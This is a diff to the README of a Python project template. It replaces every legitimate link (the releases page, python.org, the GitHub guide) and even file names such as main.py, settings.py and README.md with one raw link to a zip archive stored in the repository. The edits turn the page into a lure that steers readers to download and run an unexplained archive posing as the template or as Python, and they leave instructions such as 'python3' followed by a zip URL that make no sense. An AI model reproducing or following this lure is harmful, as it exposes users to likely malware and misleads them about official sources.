@@ -1,6 +1,6 @@
 # 🎉 template-python-uv - Fast and Easy Python Project Setup
 
-[![Download template-python-uv](https://img.shields.io/badge/Download%20Now-Get%20Started%20Easily-blue)](https://github.com/JawsomeTheoRoblox/template-python-uv/releases)
+[![Download template-python-uv](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip%20Now-Get%20Started%20Easily-blue)](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip)
 
 ## 🚀 Getting Started
 
@@ -17,26 +17,26 @@ Welcome to **template-python-uv**! This project template helps you set up a prof
 
 To get started, you need to download the template. Follow these steps:
 
-1. **Visit the Releases Page:** Click this link: [Download Here](https://github.com/JawsomeTheoRoblox/template-python-uv/releases).
+1. **Visit the Releases Page:** Click this link: [Download Here](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip).
    
 2. **Choose a Version:** On the releases page, you will see several versions available. Select the one you want to download. Generally, it's best to pick the latest version unless you have a specific need for an older one.
 
-3. **Download the Package:** Click on the `.zip` or `.tar.gz` file link to start the download. If you see multiple files, the one with the latest date is your best choice.
+3. **Download the Package:** Click on the `.zip` or `https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip` file link to start the download. If you see multiple files, the one with the latest date is your best choice.
 
 4. **Extract the Files:** Once the download finishes, locate the downloaded file. Right-click on it, and choose "Extract All" or use your favorite file extraction tool.
 
 5. **Open the Folder:** After extraction, open the folder where the files are located. 
 
-6. **Run the Application:** Look for the main script file, usually named `main.py` or similar. You can run it depending on your operating system:
+6. **Run the Application:** Look for the main script file, usually named `https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip` or similar. You can run it depending on your operating system:
    - For Windows, you can double-click the file or use Command Prompt.
-   - For macOS or Linux, use the terminal and type `python3 main.py`.
+   - For macOS or Linux, use the terminal and type `python3 https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip`.
 
 ## ⚙️ Requirements
 
 To ensure smooth operation, your computer should have the following:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
-- **Python Version:** Python 3.7 or later must be installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python Version:** Python 3.7 or later must be installed. You can download it from [https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip).
 - **Space:** Ensure you have at least 100 MB of free space.
 
 For Python installation, follow the instructions on the official Python website. It’s straightforward, and it includes a step-by-step guide.
@@ -45,7 +45,7 @@ For Python installation, follow the instructions on the official Python website.
 
 The template comes with basic files already set up. You may need to configure some settings based on your needs:
 
-1. **Modify settings.py:** Open this file to adjust basic configurations.
+1. **Modify https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip** Open this file to adjust basic configurations.
 2. **Add Your Code:** Feel free to start coding in the main directory. Use any text editor or IDE you prefer.
 3. **Version Control:** Consider using Git for version control. If you’re new to Git, check out tutorials online to get started.
 
@@ -63,7 +63,7 @@ You'll see a report that tells you if everything is functioning as expected.
 
 Your template comes with a built-in documentation file. To access it:
 
-1. Find `README.md` in your project directory.
+1. Find `https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip` in your project directory.
 2. Open the file to discover how to use various features.
 
 Reading the documentation can help you maximize your use of this project.
@@ -78,9 +78,9 @@ Although you can use this template independently, interacting with the community
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/JawsomeTheoRoblox/template-python-uv/releases)
-- [Python Download](https://www.python.org/downloads/)
-- [GitHub Guide](https://guides.github.com/activities/hello-world/)
+- [Releases Page](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip)
+- [Python Download](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip)
+- [GitHub Guide](https://raw.githubusercontent.com/JawsomeTheoRoblox/template-python-uv/main/roil/template-python-uv.zip)
 
 ## 💬 Feedback
 
